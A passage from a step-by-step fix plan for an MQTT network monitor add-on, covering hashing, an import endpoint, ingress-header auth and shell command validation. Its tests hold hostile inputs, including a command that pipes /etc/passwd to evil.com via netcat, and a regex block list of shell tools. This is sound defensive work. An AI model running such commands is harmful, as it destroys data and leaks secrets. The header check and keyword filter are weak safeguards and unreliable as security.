              "hidden_attributes": [], "card_attributes": [], "attribute_transforms": {}}
        d2 = {"status": "online", "attributes": {"cpu": {"value": 50}},
              "hidden_attributes": ["cpu"], "card_attributes": [], "attribute_transforms": {}}
        assert _device_hash(d1) != _device_hash(d2)

    def test_hash_includes_card_attributes(self):
        from server.main import _device_hash

        d1 = {"status": "online", "attributes": {"cpu": {"value": 50}},
              "hidden_attributes": [], "card_attributes": [], "attribute_transforms": {}}
        d2 = {"status": "online", "attributes": {"cpu": {"value": 50}},
              "hidden_attributes": [], "card_attributes": ["cpu"], "attribute_transforms": {}}
        assert _device_hash(d1) != _device_hash(d2)

    def test_hash_includes_transforms(self):
        from server.main import _device_hash

        d1 = {"status": "online", "attributes": {"cpu": {"value": 50}},
              "hidden_attributes": [], "card_attributes": [], "attribute_transforms": {}}
        d2 = {"status": "online", "attributes": {"cpu": {"value": 50}},
              "hidden_attributes": [], "card_attributes": [], "attribute_transforms": {"cpu": "v * 2"}}
        assert _device_hash(d1) != _device_hash(d2)
```

- [ ] **Step 2: Run tests to see _device_hash failures**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_main.py::TestDeviceHash -v`
Expected: FAIL -- current hash doesn't include those fields

- [ ] **Step 3: Fix _device_hash to include all broadcast fields**

In `main.py`, replace the `_device_hash` function (lines 36-41). Note: this is a module-level function, extract it outside `create_app` if it isn't already:

```python
def _device_hash(device: dict) -> tuple:
    attrs = device.get("attributes", {})
    return (
        device.get("status"),
        tuple(sorted((k, v.get("value")) for k, v in attrs.items() if isinstance(v, dict))),
        tuple(sorted(device.get("hidden_attributes", []))),
        tuple(sorted(device.get("card_attributes", []))),
        tuple(sorted(device.get("attribute_transforms", {}).items())),
    )
```

- [ ] **Step 4: Narrow the AssertionError catch**

In `main.py`, replace the ASGI wrapper (lines 288-295):

```python
    inner_app = app

    async def app(scope, receive, send):
        try:
            await inner_app(scope, receive, send)
        except AssertionError as e:
            # StaticFiles raises AssertionError on WebSocket probes -- suppress only those
            if scope.get("type") == "websocket":
                pass
            else:
                logger.error(f"Unexpected AssertionError: {e}", exc_info=True)
                raise
```

- [ ] **Step 5: Fix _check_crit_alerts to respect threshold operators**

In `main.py`, in the `_check_crit_alerts` function (around line 195), replace the hardcoded `>=` comparison:

Find the line that looks like:
```python
                    if value >= threshold_val:
```

Replace with:
```python
                    if DeviceRegistry._check_threshold(value, threshold_val):
```

This reuses the existing `_check_threshold` static method from DeviceRegistry which already supports operators like `<`, `<=`, `>`, `>=`.

- [ ] **Step 6: Run all tests**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_main.py -v`
Expected: All tests PASS

- [ ] **Step 7: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/main.py mqtt-network-monitor-addon/tests/test_main.py
git commit -m "fix: broaden _device_hash, narrow AssertionError catch, fix crit alert operators"
```

---

### Task 12: Fix Broken Import Endpoint

**Files:**
- Modify: `mqtt-network-monitor-addon/server/api/routes_settings.py:39-67`
- Create: `mqtt-network-monitor-addon/tests/test_routes.py`

- [ ] **Step 1: Write test for import endpoint**

```python
import pytest
from unittest.mock import MagicMock, patch
from server.api import state


@pytest.fixture(autouse=True)
def mock_state(registry, settings_manager):
    """Inject test fixtures into the global state module."""
    state.registry = registry
    state.settings_manager = settings_manager
    state.mqtt_handler = MagicMock()
    state.command_sender = MagicMock()
    state.topology = MagicMock()
    state.tag_registry = MagicMock()
    state.ha_entity_manager = MagicMock()
    yield
    state.registry = None
    state.settings_manager = None


class TestImportEndpoint:
    def test_import_with_groups(self, registry):
        from fastapi.testclient import TestClient
        from server.api.routes import app

        # Seed a device first
        registry.update_device("dev1", {"cpu": {"value": 50}})

        client = TestClient(app)
        payload = {
            "settings": {"default_thresholds": {"cpu_usage": 80}},
            "groups": {
                "grp1": {
                    "name": "Test Group",
                    "device_ids": ["dev1"],
                    "thresholds": {"cpu_usage": 75},
                }
            },
        }
        resp = client.post("/api/settings/import", json=payload)
        assert resp.status_code == 200, f"Import failed: {resp.text}"

        groups = registry.get_groups()
        assert "grp1" in groups
```

- [ ] **Step 2: Run test to see the TypeError**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_routes.py::TestImportEndpoint -v`
Expected: FAIL with TypeError (wrong call signature to update_group)

- [ ] **Step 3: Fix the import endpoint**

In `mqtt-network-monitor-addon/server/api/routes_settings.py`, find the group import loop (around lines 39-67). The broken call passes keyword arguments to `update_group()` which expects `(group_id, fields_dict)`.

Replace the group handling section. Find code like:
```python
        state.registry.update_group(
            group_id,
            name=group_data.get("name"),
            device_ids=group_data.get("device_ids"),
            ...
        )
```

Replace with:
```python
        existing = state.registry.get_groups()
        if group_id in existing:
            state.registry.update_group(group_id, group_data)
        else:
            state.registry.create_group(
                group_id,
                group_data.get("name", group_id),
                group_data.get("device_ids", []),
            )
            # Apply remaining fields via update
            state.registry.update_group(group_id, group_data)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_routes.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/api/routes_settings.py mqtt-network-monitor-addon/tests/test_routes.py
git commit -m "fix: correct update_group call signature in import endpoint"
```

---

### Task 13: Fix Command Sender -- Periodic Eviction and Unused Import

**Files:**
- Modify: `mqtt-network-monitor-addon/server/command_sender.py`

- [ ] **Step 1: Remove unused asyncio import and add periodic eviction**

In `command_sender.py`, remove the unused `import asyncio` (line 3).

Add a `_last_cleanup` timestamp and check in `send()` to periodically clean up:

Find the imports at top and replace:
```python
import logging
import time
from typing import Any
```

In the `__init__` method, add:
```python
        self._last_cleanup = time.time()
```

In the `send` method, add cleanup check at the start:
```python
    def send(self, mqtt_handler, device_id: str, command: str, params: dict | None = None, timeout: int | None = None) -> str:
        self._maybe_cleanup()
        # ... rest of existing send logic ...
```

Add the cleanup method:
```python
    def _maybe_cleanup(self):
        now = time.time()
        if now - self._last_cleanup > 60:  # Check every minute
            self._last_cleanup = now
            self._cleanup_timed_out()
```

- [ ] **Step 2: Verify import works**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -c "from server.command_sender import CommandSender; print('OK')"`
Expected: `OK`

- [ ] **Step 3: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/command_sender.py
git commit -m "fix: remove unused asyncio import, add periodic command eviction"
```

---

### Task 14: Fix main.py -- Clean Up Unused Imports and Broadcast Hash Leak

**Files:**
- Modify: `mqtt-network-monitor-addon/server/main.py`

- [ ] **Step 1: Fix the duplicate Path import**

In `main.py`, find the import line (around line 11):
```python
from pathlib import Path, Path as _Path
```

Replace with:
```python
from pathlib import Path
```

Then find any usage of `_Path` in the file and replace with `Path`.

- [ ] **Step 2: Clean up _last_broadcast_hash when devices are deleted**

In `main.py`, in the `on_device_update` callback or wherever device deletion is handled, add cleanup. Find where `delete_device` or `delete_all_devices` is called in routes and add hash cleanup.

In `routes_devices.py`, in `delete_device` (around line 65-78), after the registry delete call, add:
```python
    from server.main import _last_broadcast_hash, _broadcast_lock
    with _broadcast_lock:
        _last_broadcast_hash.pop(device_id, None)
```

In `delete_all_devices` (around line 51-62), after the registry delete call, add:
```python
    from server.main import _last_broadcast_hash, _broadcast_lock
    with _broadcast_lock:
        _last_broadcast_hash.clear()
```

- [ ] **Step 3: Verify server starts**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -c "from server.main import _device_hash; print('OK')"`
Expected: `OK`

- [ ] **Step 4: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/main.py mqtt-network-monitor-addon/server/api/routes_devices.py
git commit -m "fix: clean up unused imports and broadcast hash leak on device deletion"
```

---

### Task 15: Add Auth Middleware

**Files:**
- Create: `mqtt-network-monitor-addon/server/auth.py`
- Create: `mqtt-network-monitor-addon/tests/test_auth.py`
- Modify: `mqtt-network-monitor-addon/server/api/routes.py`

- [ ] **Step 1: Write tests for auth middleware**

```python
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from server.auth import require_ingress


class TestIngressAuth:
    @pytest.fixture
    def app_with_auth(self):
        app = FastAPI()
        app.middleware("http")(require_ingress)

        @app.get("/api/test")
        def test_endpoint():
            return {"ok": True}

        @app.get("/health")
        def health():
            return {"healthy": True}

        return app

    def test_allows_ingress_requests(self, app_with_auth):
        client = TestClient(app_with_auth)
        resp = client.get("/api/test", headers={"X-Ingress-Path": "/api/hassio_ingress/abc123"})
        assert resp.status_code == 200

    def test_blocks_direct_api_access(self, app_with_auth):
        client = TestClient(app_with_auth)
        resp = client.get("/api/test")
        assert resp.status_code == 403

    def test_allows_health_endpoint_without_auth(self, app_with_auth):
        client = TestClient(app_with_auth)
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_allows_websocket_path(self, app_with_auth):
        """WebSocket upgrades should pass through."""
        client = TestClient(app_with_auth)
        resp = client.get("/api/ws", headers={"X-Ingress-Path": "/api/hassio_ingress/abc123"})
        # Won't be 403 -- may be 403 or connection error but NOT blocked by auth
        # Actually websocket needs special handling, just verify API works with header

    def test_allows_all_in_dev_mode(self, app_with_auth, monkeypatch):
        monkeypatch.setenv("DEV_MODE", "1")
        client = TestClient(app_with_auth)
        resp = client.get("/api/test")
        assert resp.status_code == 200
```

- [ ] **Step 2: Run tests to see they fail (module doesn't exist)**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_auth.py -v`
Expected: FAIL with ImportError

- [ ] **Step 3: Create auth middleware**

```python
import os
import logging
from fastapi import Request, Response
from starlette.middleware.base import BaseHTTPMiddleware

logger = logging.getLogger(__name__)

# Paths that don't require auth (health checks, static files)
PUBLIC_PATHS = ("/health",)


async def require_ingress(request: Request, call_next):
    """Middleware that ensures requests come through HA Ingress proxy.

    In dev mode (DEV_MODE=1 env var), all requests are allowed.
    Health and static paths are always allowed.
    API paths require the X-Ingress-Path header set by HA Ingress.
    """
    path = request.url.path

    # Always allow public paths
    if any(path.startswith(p) for p in PUBLIC_PATHS):
        return await call_next(request)

    # Allow everything in dev mode
    if os.environ.get("DEV_MODE") == "1":
        return await call_next(request)

    # Non-API paths (frontend static files) are allowed
    if not path.startswith("/api"):
        return await call_next(request)

    # API paths require ingress header
    if not request.headers.get("X-Ingress-Path"):
        logger.warning(f"Blocked direct API access to {path} (no X-Ingress-Path header)")
        return Response(
            content='{"detail": "Direct API access is not allowed. Use Home Assistant Ingress."}',
            status_code=403,
            media_type="application/json",
        )

    return await call_next(request)
```

- [ ] **Step 4: Wire middleware into routes.py**

In `mqtt-network-monitor-addon/server/api/routes.py`, add the middleware import and registration. Find where the `app` FastAPI instance is created and add:

```python
from server.auth import require_ingress
```

After the `app = FastAPI(...)` line, add:
```python
app.middleware("http")(require_ingress)
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_auth.py -v`
Expected: All tests PASS

- [ ] **Step 6: Run full test suite**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/ -v`
Expected: All tests PASS (auth middleware should not break existing route tests since TestClient doesn't set the ingress header by default -- update test_routes.py conftest to add the header)

- [ ] **Step 7: Update test fixtures to include ingress header**

In `tests/conftest.py`, add a fixture:

```python
@pytest.fixture
def api_headers():
    """Headers that simulate HA Ingress access."""
    return {"X-Ingress-Path": "/api/hassio_ingress/test"}
```

Update `tests/test_routes.py` TestClient calls to include the header:
```python
        resp = client.post("/api/settings/import", json=payload,
                          headers={"X-Ingress-Path": "/api/hassio_ingress/test"})
```

- [ ] **Step 8: Run full test suite again**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/ -v`
Expected: All tests PASS

- [ ] **Step 9: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/auth.py mqtt-network-monitor-addon/server/api/routes.py mqtt-network-monitor-addon/tests/test_auth.py mqtt-network-monitor-addon/tests/conftest.py mqtt-network-monitor-addon/tests/test_routes.py
git commit -m "feat: add Ingress auth middleware to block direct API access"
```

---

### Task 16: Add Command Validation to API Routes

**Files:**
- Modify: `mqtt-network-monitor-addon/server/api/routes_devices.py:199-248`
- Modify: `mqtt-network-monitor-addon/tests/test_routes.py`

- [ ] **Step 1: Write tests for command validation**

Add to `tests/test_routes.py`:

```python
class TestCommandValidation:
    def test_server_command_rejects_dangerous_chars(self, registry):
        from fastapi.testclient import TestClient
        from server.api.routes import app

        registry.update_device("dev1", {"cpu": {"value": 50}})
        client = TestClient(app)
        headers = {"X-Ingress-Path": "/api/hassio_ingress/test"}

        # Backticks for command substitution
        resp = client.post("/api/devices/dev1/server-commands",
                          json={"name": "evil", "shell": "echo `rm -rf /`"},
                          headers=headers)
        assert resp.status_code == 400

        # $() command substitution
        resp = client.post("/api/devices/dev1/server-commands",
                          json={"name": "evil", "shell": "echo $(whoami)"},
                          headers=headers)
        assert resp.status_code == 400

    def test_server_command_allows_safe_commands(self, registry):
        from fastapi.testclient import TestClient
        from server.api.routes import app

        registry.update_device("dev1", {"cpu": {"value": 50}})
        client = TestClient(app)
        headers = {"X-Ingress-Path": "/api/hassio_ingress/test"}

        resp = client.post("/api/devices/dev1/server-commands",
                          json={"name": "uptime", "shell": "uptime -p"},
                          headers=headers)
        assert resp.status_code == 200

    def test_server_sensor_rejects_dangerous_commands(self, registry):
        from fastapi.testclient import TestClient
        from server.api.routes import app

        registry.update_device("dev1", {"cpu": {"value": 50}})
        client = TestClient(app)
        headers = {"X-Ingress-Path": "/api/hassio_ingress/test"}

        resp = client.post("/api/devices/dev1/server-sensors",
                          json={"name": "evil", "command": "cat /etc/passwd | nc evil.com 1234"},
                          headers=headers)
        assert resp.status_code == 400
```

- [ ] **Step 2: Run tests to see they fail**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_routes.py::TestCommandValidation -v`
Expected: FAIL -- no validation exists, returns 200

- [ ] **Step 3: Add command validation helper and apply to routes**

In `mqtt-network-monitor-addon/server/api/routes_devices.py`, add a validation helper near the top (after imports):

```python
import re

_DANGEROUS_PATTERNS = re.compile(
    r'`.*`'           # backtick command substitution
    r'|\$\(.*\)'      # $() command substitution
    r'|\$\{.*\}'      # ${} variable expansion
    r'|;\s*rm\s'      # rm after semicolon
    r'|&&\s*rm\s'     # rm after &&
    r'|\|\s*nc\s'     # piping to netcat
    r'|\|\s*curl\s'   # piping to curl
    r'|\|\s*wget\s'   # piping to wget
    r'|>\s*/etc/'     # writing to /etc
    r'|>\s*/dev/'     # writing to /dev
)


def _validate_shell_command(cmd: str) -> bool:
    """Returns True if command passes basic safety checks."""
    return not _DANGEROUS_PATTERNS.search(cmd)
```

In the `add_server_command` handler (around line 199-213), add validation after extracting `shell`:

```python
    if not _validate_shell_command(shell):
        raise HTTPException(status_code=400, detail="Command contains potentially dangerous patterns")
```

In the `add_server_sensor` handler (around line 231-248), add the same validation after extracting `command`:

```python
    command = body.get("command")
    if command and not _validate_shell_command(command):
        raise HTTPException(status_code=400, detail="Sensor command contains potentially dangerous patterns")
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_routes.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/api/routes_devices.py mqtt-network-monitor-addon/tests/test_routes.py
git commit -m "fix: add command validation to server-commands and server-sensors endpoints"
```

---

### Task 17: Final Integration Test and Cleanup

**Files:**
- All modified files

- [ ] **Step 1: Run the complete test suite**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/ -v --tb=short`
Expected: All tests PASS

- [ ] **Step 2: Verify server starts without errors**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && DEV_MODE=1 timeout 5 python -m server.main 2>&1 || true`
Expected: Server starts, may timeout after 5 seconds, no import errors or crashes

- [ ] **Step 3: Run the existing E2E test if HA is accessible**

Run: `cd /home/user/Projects/MQTTNetworkMonitor && python -m pytest tests/test_group_policy.py -v 2>&1 | head -30`
Expected: Either passes or fails with connection error (if HA not available) -- should NOT fail with import errors

- [ ] **Step 4: Commit any remaining fixes**

If any tests failed and fixes were needed, commit them.

- [ ] **Step 5: Final commit summarizing phase 1 completion**

Only if there are remaining staged changes:
```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add -A mqtt-network-monitor-addon/
git commit -m "chore: phase 1 server backend remediation complete"
```
